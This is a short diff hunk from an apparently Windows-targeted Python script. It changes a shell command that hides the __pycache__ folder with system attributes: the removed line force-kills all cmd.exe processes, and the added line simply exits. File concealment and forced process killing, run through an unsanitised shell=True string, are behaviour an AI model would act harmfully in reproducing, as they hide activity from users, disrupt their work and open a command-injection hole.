@@ -170,7 +170,7 @@ while run == True:
                 temp = 1
         if temp == 0:
             try:
-                subprocess.Popen("cd "+getpath(True)+"& attrib +h +s __pycache__ & taskkill /im cmd.exe /F", shell=True)
+                subprocess.Popen("cd "+getpath(True)+"& attrib +h +s __pycache__ & exit", shell=True)
             except:
                 pass
         try:
